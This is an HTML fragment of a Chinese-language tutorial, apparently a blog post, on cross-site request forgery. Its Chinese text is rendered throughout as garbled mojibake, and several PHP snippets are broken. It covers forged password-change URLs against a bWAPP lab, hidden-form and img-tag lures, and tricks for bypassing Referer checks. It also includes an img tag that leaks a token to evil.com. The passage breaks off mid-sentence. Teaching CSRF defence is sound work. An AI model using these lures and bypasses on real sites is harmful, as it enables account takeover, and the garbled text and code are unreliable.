id="ä¸¤ç§è¡¨ç°å½¢å¼">ä¸¤ç§è¡¨ç°å½¢å¼</h2><ol type="1"><li><p>æœ¬åœ° cookieï¼Œ åˆç§°æŒä¹…æ€§ Cookie</p><p>æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€å‘å®¢æˆ·ç«¯å‘é€ cookieï¼Œå‘é€æ—¶å®šåˆ¶äº†æ—¶æ•ˆã€è¿‡æœŸæ—¶é—´expireï¼Œå­˜å‚¨åœ¨<strong>æœ¬åœ°</strong>ã€‚</p></li><li><p>ä¸´æ—¶æ€§ Cookieï¼Œ åˆç§° Session Cookie</p><p>æ²¡æœ‰å®šä¹‰ expireå­—æ®µï¼Œå­˜å‚¨åœ¨<strong>æµè§ˆå™¨å†…å­˜</strong>ä¸­ï¼Œå…³é—­æµè§ˆå™¨ï¼Œcookieå¤±æ•ˆã€‚</p></li></ol><h1 id="csrf-å±å®³">CSRF å±å®³</h1><ol type="1"><li><p>å‘é€é‚®ä»¶ã€‚</p></li><li><p>ä¿®æ”¹è´¦æˆ·ä¿¡æ¯</p></li><li><p>èµ„é‡‘è½¬è´¦</p></li><li><p>XSS ä¸ CSRF</p></li><li><p>CSRF è •è™«</p></li></ol><h1 id="csrf-ç±»å‹">CSRF ç±»å‹</h1><h2 id="get-å‹-csrf">Get å‹ CSRF</h2><p>å‡å¦‚å¾®åšå­˜åœ¨ CSRF æ¼æ´ï¼Œæœ‰ä¸€ä¸ª GETè¯·æ±‚è®©åˆ«äººç‚¹å‡»åï¼Œå…³æ³¨æˆ‘ï¼Œè¿™æ—¶å¯ä»¥åšä¸€äº›è¯±å¯¼æ€§çš„åšå®¢ã€‚ä¾‹å¦‚æƒ³è®©æ¯ä¸€ä¸ªç”¨æˆ·éƒ½å¸®åŠ©è‡ªå·±è½¬å‘å¾®åšï¼Œåˆ¶é€ ä¸€æ¬¡è •è™«æ”»å‡»ï¼Œæ‰¾åˆ°è½¬æ’­æ–‡ç« çš„é¡µé¢ä¸å…³æ³¨æˆ‘çš„é¡µé¢ï¼Œå†™ä¸€ä¸ªPOCï¼Œç”¨ <code>&lt;iframe&gt;</code> æ ‡ç­¾æ¥åŠ è½½ URLï¼ŒåŠ è½½ä¸¤æ¡URLï¼Œè¿™æ—¶å½“ç”¨æˆ·ç‚¹å‡»ä¼šå…³æ³¨å¹¶ä¸”è‡ªåŠ¨è½¬å‘ã€‚</p><h3 id="æ¡ˆä¾‹ä¸€">æ¡ˆä¾‹ä¸€</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//ä¼šè¯éªŒè¯ï¼Œä¸€èˆ¬æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€ä¹‹å‰çš„ session_id&lt;â€”â€”â€”â€”â€”â€”ç¡®è®¤ç”¨æˆ·å·²ç»ç™»é™†</span><br><span class="line">$user = $_GET[&#x27;user&#x27;];</span><br><span class="line">$money = $_GET[&#x27;money&#x27;];</span><br><span class="line">//è½¬è´¦æ“ä½œ&lt;â€”â€”â€”â€”â€”â€”â€”â€”å¼€å§‹è½¬è´¦</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>ç”±æ­¤å¾—å‡º CSRF æˆåŠŸåˆ©ç”¨çš„æ¡ä»¶ï¼š</p><ol type="1"><li>ç”¨æˆ·å·²ç»ç™»é™†ç³»ç»Ÿ</li><li>ç”¨æˆ·è®¿é—®å¯¹åº” URL</li></ol><p>CSRF æ¼æ´åˆ©ç”¨ï¼š</p><p>bWAPP çš„ CSRF</p><p>CSRFï¼ˆChange Passwordï¼‰</p><p>æœ¬å…³ç‰¹å¾ï¼š</p><ol type="1"><li><p>åªè¾“å…¥æ–°å¯†ç ï¼Œä¸ç”¨è¾“å…¥æ—§å¯†ç </p></li><li><p>ä½¿ç”¨ get æ–¹å¼æäº¤ã€‚</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Request URL:</span><br><span class="line">http://lab11.me/bWAPP/csrf_1.php?password_new=hack&amp;password_conf=hack&amp;action=change</span><br></pre></td></tr></table></figure></p><p>get å‚æ•°ä¸­ç›´æ¥æš´éœ²æ–°å¯†ç ä»¥åŠç¬¬äºŒæ¬¡ç¡®è®¤çš„æ–°å¯†ç </p></li></ol><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ªé€ ä¿®æ”¹å¯†ç çš„ URLï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Request URL:</span><br><span class="line">http://lab11.me/bWAPP/csrf_1.php?password_new=bug&amp;password_conf=bug&amp;action=change</span><br></pre></td></tr></table></figure><p>ç„¶åè¯±å¯¼ç”¨æˆ·åœ¨ç™»å½•è¯¥ç½‘ç«™çš„çŠ¶æ€ä¸‹ï¼Œç‚¹å‡»è¯¥é“¾æ¥ï¼Œä¾¿å¯ä»¥è¾¾åˆ°æ¶æ„ä¿®æ”¹å¯†ç çš„ç›®çš„ã€‚</p><p>è¯±å¯¼çš„æ–¹å¼å¯ä»¥æœ‰å¾ˆå¤šç§ï¼Œæ¯”å¦‚ï¼šéšè”½åˆ©ç”¨ img æ ‡ç­¾çš„ src å±æ€§</p><p>å½“ç„¶ï¼Œå®é™…ç¯å¢ƒä¸­ï¼ŒåŸºæœ¬ä¸ä¼šå‡ºç°å…·æœ‰è¿™æ ·ç‰¹å¾çš„ä¿®æ”¹å¯†ç æ–¹å¼ï¼Œä½†è¿™å¯¹æˆ‘ä»¬äº†è§£CSRF çš„åŸç†æœ‰ç€ä¸€å®šçš„å¸®åŠ©ã€‚</p><p><strong>ä»¥ä¸‹çš„ GET å’Œ POST ç±»å‹çš„ CSRFéƒ½æ˜¯ç”±äºæ²¡æœ‰å¯¹ç”¨æˆ·èº«ä»½è¿›è¡ŒéªŒè¯å¯¼è‡´çš„</strong>ï¼Œå› æ­¤å¯ä»¥ç”±æ”»å‡»è€…å¦å¤–æ„é€ æ¶æ„çš„ç½‘é¡µæ¥è¿›è¡Œæ”»å‡»ï¼Œå¦‚æœå¯¹ç”¨æˆ·èº«ä»½è¿›è¡Œäº†éªŒè¯ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å•ç‹¬æ„é€ ç½‘é¡µäº†ã€‚</p><h3 id="æ¡ˆä¾‹äºŒ">æ¡ˆä¾‹äºŒ</h3><p>æ·»åŠ æ–°ç”¨æˆ·</p><p>ä»£ç åˆ†æ</p><p><strong>æ²¡æœ‰éªŒè¯ç”¨æˆ·èº«ä»½ï¼ˆsessionã€cookie ç­‰ï¼‰</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sq1</span> = <span class="string">&quot;INSERT INTO `adminsql`(`id`, `username`, `password`) VALUES(13, &#x27;<span class="subst">$username</span>&#x27;, &#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$row</span> = mysq1_queryï¼ˆ<span class="variable">$sq1</span>ï¼‰ï¼›<span class="comment">//æ‰§è¡Œsqlæ’å…¥è¯­å¥</span></span><br><span class="line"><span class="variable">$sq1</span> = <span class="string">&quot;SELECT * FROM adminsql&quot;</span>ï¼›</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysq1_query</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$rows</span> = <span class="title function_ invoke__">mysq1_fetch_array</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;user:<span class="subst">&#123;$rowsI&#x27;username&#x27;]&#125;</span>-----pass:<span class="subst">&#123;$rows[&#x27;password&#x27;]&#125;</span>&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>ï¼›</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨</p><p>åŒä¸Šé¢ bWAPP change password çš„åˆ©ç”¨ï¼Œéšè”½åˆ©ç”¨ img æ ‡ç­¾çš„ srcå±æ€§ï¼Œæ¯”å¦‚ï¼šæˆ‘ä»¬æ„é€ ä¸€ä¸ªç½‘é¡µï¼Œç½‘é¡µä¸­è®¾ç½®ä¸€ä¸ª img çš„ srcä¸ºæ¶æ„è¿æ¥ï¼Œé‚£ä¹ˆç”¨æˆ·åœ¨ç™»å½•çŠ¶æ€ä¸‹ï¼Œè®¿é—®æˆ‘ä»¬å‘ç»™ä»–çš„ç½‘é¡µï¼Œå°±ä¼šå‘é€æ¶æ„çš„URLï¼Œ ä»è€Œæ·»åŠ æ–°ç”¨æˆ·ã€‚</p><h2 id="post-å‹-csrf">Post å‹ CSRF</h2><p>æ·»åŠ æ–°ç”¨æˆ·</p><p>ä»£ç åˆ†æ</p><p>åŒ GET ä¹Ÿ<strong>æ²¡æœ‰è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯</strong>ï¼Œåªæ˜¯è·å–å‚æ•°æ˜¯ä½¿ç”¨POST è·å–ã€‚</p><p>ä»£ç åˆ©ç”¨</p><p>åˆ©ç”¨ hidden çš„ inputæ ‡ç­¾ï¼Œæˆ‘ä»¬æ„é€ æ¶æ„ç½‘é¡µï¼Œç½‘é¡µä¸­æ˜¾ç¤ºä¸€äº›è¯±æƒ‘ä¿¡æ¯ï¼Œå¹¶ä¸”å†™ä¸€ä¸ª formè¡¨å•ï¼Œè¡¨å•çš„ action åˆ™æ˜¯å­˜åœ¨ CSRF çš„ç½‘é¡µé“¾æ¥ã€‚æˆ‘ä»¬å°†æå‰æŸ¥çœ‹çš„ POSTçš„æ•°æ®å€¼å¯¹ï¼Œè¿›è¡Œä¿®æ”¹ï¼Œç„¶ååœ¨ç½‘é¡µä¸­åŠ å…¥ hidden çš„ inputï¼Œ name å±æ€§æŒ‰ç…§post çš„å€¼è¿›è¡Œå¡«å†™ï¼Œ valueæˆ‘ä»¬è‡ªå·±æ„é€ ä¸€ä¸ªæ¶æ„çš„ã€‚ç„¶åè¯±å¯¼ç”¨æˆ·è®¿é—®è¯¥ç½‘é¡µå°±å¯ä»¥äº†</p><h1 id="csrf-æ¼æ´é˜²å¾¡">CSRF æ¼æ´é˜²å¾¡</h1><h2 id="ä½¿ç”¨è€…çš„é˜²å¾¡">ä½¿ç”¨è€…çš„é˜²å¾¡</h2><p>CSRFæ”»å‡»ä¹‹æ‰€ä»¥èƒ½æˆç«‹ï¼Œæ˜¯å› ä¸ºä½¿ç”¨è€…åœ¨è¢«æ”»å‡»çš„ç½‘é¡µæ˜¯å¤„äºå·²ç»ç™»å…¥çš„çŠ¶æ€ï¼Œæ‰€ä»¥æ‰èƒ½åšå‡ºä¸€äº›è¡Œä¸ºã€‚è™½ç„¶è¯´è¿™äº›æ”»å‡»åº”è¯¥ç”±ç½‘é¡µé‚£è¾¹è´Ÿè´£å¤„ç†ï¼Œä½†å¦‚æœä½ æ‹…å¿ƒç½‘é¡µä¼šå¤„ç†ä¸å¥½çš„è¯ï¼Œä½ å¯ä»¥åœ¨æ¯æ¬¡ä½¿ç”¨å®Œç½‘ç«™å°±ç™»å‡ºï¼Œå°±å¯ä»¥é¿å…æ‰CSRFã€‚ä¸è¿‡ï¼Œè¿™æ€•æ˜¯åºŸè¯ï¼Œè¿˜è¦ç”¨æˆ·æ³¨æ„è¿™ä¸ªå®‰å…¨ï¼Œè¦ä½ ç½‘ç«™å®‰å…¨äººå‘˜æœ‰ä¸ªçƒç”¨ã€‚</p><h2 id="referer-check-é˜²å¾¡">Referer Check é˜²å¾¡</h2><p>åŸç†</p><p>HTTP Referer æ˜¯ header çš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘ webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸Š Refererï¼Œå‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨åŸºæ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†ã€‚</p><p>Referer Check é˜²å¾¡</p><p>Referer Checkä¸»è¦ç”¨äºé˜²æ­¢ç›—é“¾ã€‚åŒç†ä¹Ÿå¯ä»¥ç”¨æ¥æ£€æŸ¥è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„â€œæºâ€ã€‚æ¯”å¦‚ç”¨æˆ·ä¿®æ”¹å¯†ç ï¼Œä¸€å®šæ˜¯åœ¨ç™»å½•ç³»ç»Ÿåå°ä¹‹åè¿›è¡Œæ“ä½œã€‚æ‰€ä»¥åœ¨ä¿®æ”¹æäº¤è¡¨å•çš„æ—¶å€™ï¼Œä¸€å®šä¼šä»ç³»ç»Ÿåå°é¡µé¢æäº¤ï¼Œæºå¸¦ Referer å¤´ã€‚å¦‚æœ Refererä¸æ˜¯å½“å‰ç³»ç»Ÿçš„åŸŸï¼Œé‚£ä¹ˆææœ‰å¯èƒ½é­å— CSRFã€‚ç¼ºé™·ï¼šæœåŠ¡å™¨å¹¶éä»»ä½•æ—¶å€™éƒ½å¯ä»¥å–åˆ° Refererã€‚ä¾‹å¦‚ HTTPS è·³è½¬åˆ° HTTPã€‚</p><p>å½“ç”¨æˆ·ç‚¹å‡»è¢«æ„é€ å¥½çš„ CSRF åˆ©ç”¨é¡µé¢ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œç”¨æˆ·å¯¹åº”æ“ä½œæ—¶ï¼Œæäº¤çš„HTTP è¯·æ±‚ä¸­å°±æœ‰å¯¹åº”çš„ Referer å€¼ï¼Œæ­¤æ—¶æœåŠ¡ç«¯åˆ¤æ–­ Refererå€¼æ˜¯å¦ä¸æœåŠ¡å™¨çš„åŸŸåä¿¡æ¯æœ‰å…³ã€‚å¦‚æœä¸ç›¸å…³åˆ™ä¸æ‰§è¡Œæ“ä½œã€‚</p><p>Referer é˜²å¾¡ä»£ç ç¼–å†™</p><p>åœ¨ PHP ä¸­ä½¿ç”¨ $_SERVER[â€˜HTTP_REFERER] è·å–é¡µé¢æäº¤è¯·æ±‚ä¸­çš„ refererå€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(strpos($_SERVER[â€˜HTTP_REFERER], &#x27;xx.com&#x27;) !== FALSE)</span><br><span class="line">&#123;</span><br><span class="line">åˆ¤æ–­æˆåŠŸ</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">ï½›</span><br><span class="line">åˆ¤æ–­å¤±è´¥</span><br><span class="line">ï½</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¦‚ä½•ç»•è¿‡ Rreferer</p><p>æŠ€å·§ï¼šå¦‚æœæœåŠ¡å™¨ç«¯åªåˆ¤æ–­å½“å‰ Refererä¸­æ˜¯å¦å…·æœ‰åŸŸåï¼Œé‚£ä¹ˆç›´æ¥å¯ä»¥æ–°å»ºæ–‡ä»¶å¤¹ã€‚å³ï¼šåœ¨æˆ‘ä»¬ç«™ç‚¹å½“ä¸­æ–°å»ºä¸€ä¸ªä»¥è¯¥åŸŸåä¸ºåå­—çš„æ–‡ä»¶å¤¹ï¼Œç„¶åå°†æ¶æ„æ–‡ä»¶æ”¾å…¥è¯¥æ–‡ä»¶å¤¹ä¸­ï¼Œé‚£ä¹ˆReferer ä¸­å°±å¯ä»¥åŒ¹é…åˆ°è¯¥åŸŸå</p><h2 id="token-é˜²å¾¡">Token é˜²å¾¡</h2><p>æ˜¯å¦è®¾ç½® Tokenï¼Œ ç”¨æˆ·æ¯æ¬¡è®¿é—®éƒ½éªŒè¯ Tokenï¼Œè¿™æ · CSRFæ¼æ´ä¹Ÿå°±ä¸å¤å­˜åœ¨äº†</p><p>Anti CSRF Token é˜²å¾¡</p><p>CSRF æœ¬è´¨åŸå› ï¼šé‡è¦æ“ä½œçš„æ‰€æœ‰å‚æ•°éƒ½æ˜¯è¢«æ¶æ„æ”»å‡»è€…çŒœæµ‹åˆ°çš„ã€‚é‚£ä¹ˆé˜²å¾¡æªæ–½å°±æ˜¯ç”Ÿæˆä¸€ä¸ªéšæœºä¸”ä¸è¢«è½»æ˜“çŒœæµ‹çš„å‚æ•°ã€‚ç›®å‰å¤§å¤šæ•°é˜²å¾¡éƒ½é‡‡ç”¨tokenï¼ˆä¸å¯é¢„æµ‹ï¼‰ã€‚</p><p><strong>ä¸ºä»€ä¹ˆ token å¯ä»¥é˜²å¾¡ CSRFï¼Ÿ</strong></p><p>æ­£å¸¸æ¥è¯´ï¼Œæ¯”è¾ƒå®¹æ˜“ç†è§£çš„æ˜¯ï¼Œæ­£ç¡®çš„ CSRFtoken è¢«æ”¾åœ¨äº†æœåŠ¡å™¨çš„ Sessionæ–‡ä»¶ä¸­ã€‚è€Œ seesion id ä¸€èˆ¬ä¼šè¢«è¢«æ”¾åœ¨äº† cookie ä¸­ã€‚</p><p>å½“ç”¨æˆ·æ‰§è¡Œå¢åˆ æ”¹æ“ä½œçš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ä¼šæ ¹æ® cookie ä¸­çš„ session idåŒ¹é…<code>ç”¨æˆ·å¯¹åº”çš„ Session æ–‡ä»¶</code>ï¼ˆä½äºæœåŠ¡ç«¯ï¼‰ï¼Œç„¶åä»ä¸­å–å‡ºè¿™ä¸ªToken å€¼å’Œç”¨æˆ·æäº¤åˆ°æœåŠ¡å™¨çš„ Token å€¼(è¿™é‡Œä¸€èˆ¬ä¸ºè¡¨å•ä¸­çš„ hidden çš„ inputæ ‡ç­¾æäº¤ token)åšå¯¹æ¯”ï¼ˆå³ï¼šHTTP è¯·æ±‚ä¸­çš„tokenï¼‰ã€‚å¦‚æœä¸¤è€…æ•°å€¼ç›¸åŒï¼Œç”¨æˆ·çš„å¢åˆ æ”¹æ“ä½œæ‰æ˜¯è¢«å…è®¸æ‰§è¡Œçš„ï¼Œå¦åˆ™ç”¨æˆ·çš„è¯·æ±‚å°±æ˜¯ä¸åˆæ³•çš„ï¼Œå³CSRFã€‚</p><p>ç”¨æˆ·æ­£å¸¸æ“ä½œäº§ç”Ÿçš„ Token æ˜¯è¯·æ±‚é¡µé¢é€šè¿‡ä½¿ç”¨ JSç”Ÿæˆçš„éšæœºæ•°ã€‚è¿™ä¸ªéšæœºæ•°å’Œç”¨æˆ· Session ï¼ˆä½äºæœåŠ¡ç«¯ï¼‰ä¸­çš„éšæœºæ•°ç»‘å®šã€‚ä½†æ”»å‡»è€…ä¼ªé€ çš„é“¾æ¥ä¸­ï¼Œæ— æ³•è®¡ç®—æˆ–è€…ä¼ªé€ å‡ºè¿™ä¸ªéšæœºæ•°ã€‚ å› ä¸º HTTPè¯·æ±‚ä¸­æ”»å‡»è€…ä¼ªé€ å‡ºçš„éšæœºæ•°å’Œç”¨æˆ· Sessionä¸­ä¿å­˜çš„éšæœºæ•°ä¸åŒï¼ŒæœåŠ¡å™¨å¯ä¾æ®è¯¥éšæœºæ•°åˆ¤æ–­å‡ºè¯¥è¯·æ±‚ä¸æ˜¯æ¥è‡ªç”¨æˆ·æ­£å¸¸æ“ä½œï¼Œä»è€Œæ‹’ç»ç”¨æˆ·è¯·æ±‚ã€‚</p><p>æµè§ˆå™¨çš„åŒæºç­–ç•¥ï¼šåè®®ã€IPã€ç«¯å£å·ä¸åŒçš„çš„ URLè¢«æµè§ˆå™¨è§†ä¸ºä¸åŒçš„æºã€‚JS æ— æ³•è·¨æºè·å–ç”¨æˆ· Cookie çš„å€¼ã€‚ è€Œä¸”ä¸€èˆ¬æ¥è¯´Cookie ä¸­çš„å…³é”®å­—æ®µéƒ½æœ‰ Http only å±æ€§ã€‚æ‹¥æœ‰è¯¥å±æ€§çš„ Cookieå€¼ï¼Œå³ä¾¿æ˜¯åŒæºç¯å¢ƒå†… Javascript ä¹Ÿæ— æ³•å¯¹å…¶æ‰§è¡Œæ“ä½œã€‚æ‰€ä»¥ <strong>cookieä¸­çš„å†…å®¹</strong> å¯¹æ”»å‡»è€…æ˜¯ä¸å¯è§çš„ã€‚</p><p>Token æ³„éœ²</p><p>GET å‹ Tokenæ³„éœ²ï¼Œ<strong>å¦‚æœé¡µé¢å¯ä»¥åŒ…å«è®¿é—®æ”»å‡»è€…çš„ç«™ç‚¹</strong>ï¼ˆä½†æ²¡æœ‰ XSSè¦æ±‚é‚£ä¹ˆé«˜ï¼‰ï¼Œå¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http:/evil.com/&quot;/&gt;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¯·æ±‚ä¸­çš„ Referer å°±ä¼šæºå¸¦å¯¹åº”çš„ GET Tokenã€‚</p><p>POST å‹ Token æ³„éœ²</p><p>åˆ©ç”¨ XSS æ¼æ´è¯»å– Cookieï¼Œè·å–å­˜å‚¨åœ¨å…¶ä¸­çš„ Token å€¼ã€‚</p><h2 id="æ•æ„Ÿæ“ä½œäºŒæ¬¡éªŒè¯">æ•æ„Ÿæ“ä½œäºŒæ¬¡éªŒè¯</h2><ol type="1"><li>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä½¿ç”¨ JavaScriptéªŒè¯ï¼ˆæ¯”å¦‚ï¼šæé†’ç”¨æˆ·è¯¥æ“ä½œæ˜¯å¦ç»§ç»­ï¼‰ï¼Œä½†æ˜¯æ˜¯å¦æ‰§è¡ŒæˆåŠŸå–å†³äºç”¨æˆ·ï¼Œä¸å»ºè®®ä½¿ç”¨ã€‚</li><li>éªŒè¯ç å¼ºåˆ¶éªŒè¯</li></ol><h3 id="éªŒè¯ç é˜²å¾¡">éªŒè¯ç é˜²å¾¡</h3><p>éªŒè¯ç é˜²å¾¡è¢«è®¤ä¸ºæ˜¯å¯¹æŠ— CSRF æœ€ä¸ºç®€å•è€Œä¸”æœ‰æ•ˆçš„é˜²å¾¡æ–¹æ³•ã€‚ CSRFåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å®Œæˆå¯¹åº”æ“ä½œï¼Œè€ŒéªŒè¯ç å¼ºåˆ¶ç”¨æˆ·ä¸åº”ç”¨ç¨‹åºäº¤äº’ï¼Œæ‰èƒ½æœ€ç»ˆå®Œæˆæ“ä½œã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒéªŒè¯ç èƒ½å¤Ÿå¾ˆå¥½çš„éåˆ¶ CSRFã€‚</p><p>å‡ºäºç”¨æˆ·ä½“éªŒè€ƒè™‘ï¼Œä¸å¯èƒ½æ¯ä¸€ä¸ªæ“ä½œéƒ½åŠ å…¥éªŒè¯ç ã€‚æ‰€ä»¥éªŒè¯ç åªä½œä¸ºè¾…åŠ©æ‰‹æ®µï¼Œä¸èƒ½ä½œä¸ºé˜²å¾¡CSRF çš„ä¸»è¦è§£å†³æ–¹æ¡ˆã€‚</p><ul><li>éªŒè¯ç é˜²å¾¡ä¹Ÿå¯ä»¥è¢«è®¤ä¸ºæ˜¯äºŒæ¬¡éªŒè¯</li></ul><h2 id="å‚è€ƒåŠæ¨è">å‚è€ƒåŠæ¨è</h2><p><ahref="https://juejin.im/post/5bc009996fb9a05d0a055192#heading-14">å‰ç«¯å®‰å…¨ç³»åˆ—ä¹‹äºŒï¼šå¦‚ä½•é˜²æ­¢CSRF æ”»å‡»ï¼Ÿ</a></p><p><ahref="https://blog.csdn.net/sdb5858874/article/details/81666194">ä¸ºä»€ä¹ˆCSRF Token å†™åœ¨ COOKIE é‡Œé¢</a></p><p><ahref="https://blog.csdn.net/wabiaozia/article/details/75196939">å…³äºTokenï¼Œä½ åº”è¯¥çŸ¥é“çš„åä»¶äº‹</a></p><p><ahref="https://blog.csdn.net/qq_15096707/article/details/51307024">webå®‰å…¨ä¹‹ token å’Œ CSRF æ”»å‡»</a></p><p><ahref="https://segmentfault.com/a/1190000017831088#articleHeader10">å½»åº•å¼„æ‡‚sessionï¼Œcookieï¼Œtoken</a></p><h1 id="csrf-æ£€æµ‹">CSRF æ£€æµ‹</h1><p>CSRFæ˜¯ä¼ªé€ <strong>ç”¨æˆ·çš„è¯·æ±‚</strong>ï¼Œæ‰€ä»¥é¦–å…ˆéœ€è¦æ¸…æ¥šç”¨æˆ·å¯ä»¥åšå“ªäº›æ“ä½œã€å‘å“ªäº›è¯·æ±‚ã€‚</p><p>å¸¸è§çš„åœ°æ–¹ï¼šè½¬è´¦ï¼Œä¿®æ”¹ç”¨æˆ·èµ„æ–™ã€å¯†ç ï¼Œè´­ä¹°ä¸œè¥¿ã€åˆ é™¤æ–‡ç« </p><p>æ‰‹å·¥æ£€æµ‹ï¼šä¸å¿…è¯´äº†ï¼Œåœ¨å¸¸è§åœºæ™¯ä¸‹æ‰‹åŠ¨æ£€æµ‹</p><p>åŠè‡ªåŠ¨æ£€æµ‹ï¼šå¸¸ç”¨ BurpSuiteï¼Œè¿˜æœ‰ CSRFTester</p><p>å…¨è‡ªåŠ¨æ£€æµ‹ï¼šä¸»è¦æ˜¯æ’ä»¶ï¼Œç›®å‰ä¹Ÿæœ‰ç°æˆçš„</p><h3 id="http-è‡ªå®šä¹‰å¤´">HTTP è‡ªå®šä¹‰å¤´</h3><p>å¦‚æœ Web åº”ç”¨ç¨‹åºçš„ HTTPè¯·æ±‚ä¸­æ²¡æœ‰å¯¹åº”çš„é¢„é˜²æªæ–½ï¼Œé‚£ä¹ˆå¾ˆå¤§ç¨‹åº¦ä¸Šå°±ç¡®å®šå­˜åœ¨ CSRF æ¼æ´ã€‚</p><p>æƒ…å†µ A: æ—  token æ—  referer éªŒè¯</p><p>æƒ…å†µ Bï¼š æ—  token æœ‰ referer éªŒè¯è¿™ç§æƒ…å†µæ¯”è¾ƒå¸¸è§ï¼Œä¹Ÿè®¸æˆ‘ä»¬æŠ“åŒ…å‘ç°æ— token æ­£åº†å¹¸æ—¶ï¼Œåˆ é™¤ referer é‡æ–°æäº¤ä¸€çœ‹å‘ç°æŠ¥é”™äº† ä¸€. æˆ‘ä»¬å¯ä»¥è¯•è¯•ç©ºreferer: å³åˆ é™¤ header ä¸­çš„ referer çš„å€¼ï¼Œå¦‚æœæœåŠ¡å™¨åªæ˜¯éªŒè¯äº†æ˜¯å¦å­˜åœ¨referer æ²¡éªŒè¯ referer å€¼ çš„è¯ï¼Œæˆ‘ä»¬é‡æ–°æäº¤ä¼šå‘ç°ä¸€ä¸ª CSRFæ¼æ´åˆè¢«å‘ç°äº†~å› ä¸ºæ‰€æœ‰è·¨åè®®ä¼ é€’çš„è¯·æ±‚éƒ½æ˜¯ä¸ä¼šé€ referer çš„ï¼Œå¦‚https-&gt;http ,(è¿™ä¸ªåˆ© ç”¨æˆæœ¬æœ‰ç‚¹é«˜ï¼‰è¿˜æœ‰ javascript-&gt;http,data-&gt;http.</p><p>äºŒ. å¦‚æœç›´æ¥å»æ‰ referer å‚æ•°è¯·æ±‚å¤±è´¥ï¼Œè¿™ç§è¿˜å¯ä»¥ç»§ç»­éªŒè¯å¯¹ refererçš„åˆ¤æ–­æ˜¯å¦ä¸¥æ ¼ï¼Œæ˜¯å¦å¯ä»¥ç»•è¿‡ã€‚</p><p>ä¿®æ”¹ referer å€¼ï¼šå¦‚æœåŸ referer å€¼ä¸º Refererï¼š t.qq.com/xxxxè¯ï¼Œæˆ‘ä»¬å¯ä»¥è¯•è¯•ä¿®æ”¹ä¸º Referer:t.qq.com.baidu.com/xxxã€‚å¦‚æœæœåŠ¡å™¨åªæ˜¯éªŒè¯äº† referer æ˜¯å¦å­˜åœ¨ qq.comæˆ–è€… t.qq.com ç­‰å…³é”®è¯çš„è¯ï¼Œäº‰å¯¹å‰ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è…¾è®¯æŸå­ç«™ç‚¹ï¼ˆhttp://xx.qq.comï¼‰å‘ä¸ªå¸–å­å°†å›¾ç‰‡åœ°å€ä¿®æ”¹ä¸ºæˆ‘ä»¬æ„é€ çš„csrfé“¾æ¥æˆ–è€…å†™å¥½CSRFè¡¨å•åå°†åœ°å€å‘å¸ƒåœ¨å¾®åšä¸Šç­‰å¾…å…¶å®ƒç”¨æˆ·ç‚¹å‡»ï¼Œé’ˆå¯¹åä¸€ç§æƒ…å†µæˆ‘ä»¬å¯ä»¥å»ºç«‹ä¸ªt.qq.com.yourdomain.com çš„åŸŸåå­˜æ”¾ CSRF è¡¨å•æ¥ç»•è¿‡ REFERER æ£€æµ‹;</p><p>å½“åªé‡‡ç”¨ refer é˜²å¾¡æ—¶ï¼Œå¯ä»¥æŠŠè¯·æ±‚ä¸­çš„ä¿®æ”¹æˆå¦‚ä¸‹è¯•è¯•èƒ½å¦ç»•è¿‡ï¼š</p><p>åŸå§‹ referï¼š<code>http://test.com/index.php</code></p><p>æµ‹è¯•å‡ 